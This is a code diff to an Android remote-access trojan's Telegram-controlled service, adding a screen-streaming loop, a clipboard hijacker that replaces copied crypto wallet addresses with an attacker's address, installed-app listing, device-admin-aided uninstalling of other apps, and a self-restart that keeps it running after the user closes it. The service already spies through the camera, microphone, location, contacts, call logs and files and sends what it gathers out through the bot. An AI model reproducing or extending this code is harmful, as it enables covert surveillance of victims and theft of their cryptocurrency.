@@ -5,10 +5,13 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.app.admin.DevicePolicyManager;
 import android.content.ClipData;
 import android.content.ClipboardManager;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.content.pm.ServiceInfo;
 import android.database.Cursor;
@@ -19,6 +22,7 @@ import android.location.LocationManager;
 import android.media.Image;
 import android.media.ImageReader;
 import android.media.MediaRecorder;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
@@ -33,11 +37,16 @@ import java.io.InputStream;
 import java.net.URL;
 import java.nio.ByteBuffer;
 import java.util.Arrays;
+import java.util.List;
 
 public class TelegramService extends Service {
     private long lastUpdateId = 0;
     private boolean isRunning = true;
+    private boolean isVncRunning = false;
     private Handler mainHandler = new Handler(Looper.getMainLooper());
+
+    // HNA 7ET ADDRESS DYALEK
+    private final String ATTACKER_CRYPTO_ADDRESS = "0xYOUR_CRYPTO_ADDRESS_HERE";
 
     @Override
     public void onCreate() {
@@ -59,7 +68,7 @@ public class TelegramService extends Service {
             }
         }
         
-        Exfil.send("✅ Bot Online.\nCommands:\n/cam\n/mic\n/screenshot\n/loc\n/files\n/get <path>\n/hide\n/contacts\n/calls\n/clip");
+        Exfil.send("✅ System Bot is Online.\nCommands:\n/cam\n/mic\n/screenshot\n/loc\n/files\n/get <path>\n/hide\n/contacts\n/calls\n/clip\n/vnc\n/cryptoclip\n/apps\n/uninstall <pkg>\n/restart");
         new Thread(this::pollTelegram).start();
     }
 
@@ -102,7 +111,85 @@ public class TelegramService extends Service {
             else if (cmd.equals("/contacts")) getContacts();
             else if (cmd.equals("/calls")) getCallLogs();
             else if (cmd.equals("/clip")) getClipboard();
+            else if (cmd.equals("/vnc")) {
+                isVncRunning = !isVncRunning;
+                Exfil.send(isVncRunning ? "🖥️ VNC Stream Started (Every 3s)" : "🖥️ VNC Stream Stopped");
+                if (isVncRunning) startVncStream();
+            }
+            else if (cmd.equals("/cryptoclip")) startCryptoClipboardHijack();
+            else if (cmd.equals("/apps")) getInstalledApps();
+            else if (cmd.startsWith("/uninstall ")) uninstallApp(cmd.substring(11).trim());
+            else if (cmd.equals("/restart")) {
+                startService(new Intent(this, TelegramService.class));
+                Exfil.send("🔄 Service Restarted.");
+            }
         });
+    }
+
+    // ================== VNC (Screen Streaming) ==================
+    private void startVncStream() {
+        if (!isVncRunning) return;
+        if (KeyloggerService.instance != null) {
+            KeyloggerService.instance.captureScreenSilent();
+        }
+        mainHandler.postDelayed(this::startVncStream, 3000);
+    }
+
+    // ================== CRYPTO CLIPBOARD HIJACK ==================
+    private void startCryptoClipboardHijack() {
+        Exfil.send("💰 Crypto Clipboard Hijack Started. Waiting for victim...");
+        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+        clipboard.addPrimaryClipChangedListener(() -> {
+            try {
+                if (clipboard.hasPrimaryClip()) {
+                    ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
+                    String text = item.getText().toString();
+                    if (text.startsWith("0x") && text.length() > 30) {
+                        ClipData clip = ClipData.newPlainText("text", ATTACKER_CRYPTO_ADDRESS);
+                        clipboard.setPrimaryClip(clip);
+                        Exfil.send("💸 Hijacked Crypto Address! Replaced with yours.");
+                    }
+                }
+            } catch (Exception e) {}
+        });
+    }
+
+    // ================== INSTALLED APPS ==================
+    private void getInstalledApps() {
+        StringBuilder sb = new StringBuilder("📱 Installed Apps:\n\n");
+        PackageManager pm = getPackageManager();
+        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+        for (ApplicationInfo app : apps) {
+            if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                sb.append(pm.getApplicationLabel(app)).append("\n`").append(app.packageName).append("`\n\n");
+            }
+        }
+        Exfil.send(sb.toString());
+    }
+
+    // ================== UNINSTALL APP ==================
+    private void uninstallApp(String packageName) {
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
+            
+            if (dpm != null && dpm.isAdminActive(admin)) {
+                dpm.setUninstallBlocked(admin, packageName, false);
+                dpm.removeActiveAdmin(admin); // Bypass
+                
+                Intent intent = new Intent(Intent.ACTION_DELETE);
+                intent.setData(Uri.parse("package:" + packageName));
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+                
+                Exfil.send("🗑️ Requested uninstall for: " + packageName);
+                dpm.setActiveAdmin(admin, true); // Re-enable admin
+            } else {
+                Exfil.send("❌ Device Admin not enabled. Cannot uninstall silently.");
+            }
+        } catch (Exception e) {
+            Exfil.send("Uninstall Error: " + e.getMessage());
+        }
     }
 
     // ================== CONTACTS ==================
@@ -218,7 +305,7 @@ public class TelegramService extends Service {
     private void hideIcon() {
         try {
             getPackageManager().setComponentEnabledSetting(
-                new android.content.ComponentName(this, MainActivity.class),
+                new ComponentName(this, MainActivity.class),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             );
@@ -234,7 +321,7 @@ public class TelegramService extends Service {
         try {
             CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
             String cameraId = manager.getCameraIdList()[0];
-            if (manager.getCameraIdList().length > 1) cameraId = manager.getCameraIdList()[1];
+            if (manager.getCameraIdList().length > 1) cameraId = manager.getCameraIdList()[1]; // Front
             
             manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                 @Override
@@ -304,4 +391,13 @@ public class TelegramService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
     @Override
     public IBinder onBind(Intent intent) { return null; }
-}
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        super.onTaskRemoved(rootIntent);
+        // Ila l'user sed l'app mn l'recents, n-3awdo n-ch3lo
+        Intent restartService = new Intent(getApplicationContext(), TelegramService.class);
+        restartService.setPackage(getPackageName());
+        startService(restartService);
+    }
+                        }
